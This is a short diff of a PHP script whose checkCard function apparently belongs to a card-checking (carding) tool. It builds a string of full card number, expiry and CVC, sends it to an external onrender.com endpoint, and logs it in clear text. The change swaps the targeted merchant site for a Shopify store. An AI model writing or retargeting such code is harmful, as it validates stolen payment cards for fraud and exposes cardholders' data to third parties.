@@ -21,7 +21,7 @@ function log_message($message) {
 function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
     $card_details = "$card_number|$exp_month|$exp_year|$cvc";
     $encoded_cc = urlencode($card_details);
-    $api_url = "https://rocks-mbs7.onrender.com/index.php?site=https://howtocakeit.com&cc=$encoded_cc";
+    $api_url = "https://rocks-mbs7.onrender.com/index.php?site=https://132461-96.myshopify.com&cc=$encoded_cc";
     log_message("Checking card: $card_details, URL: $api_url");
 
     for ($attempt = 0; $attempt <= $retry; $attempt++) {
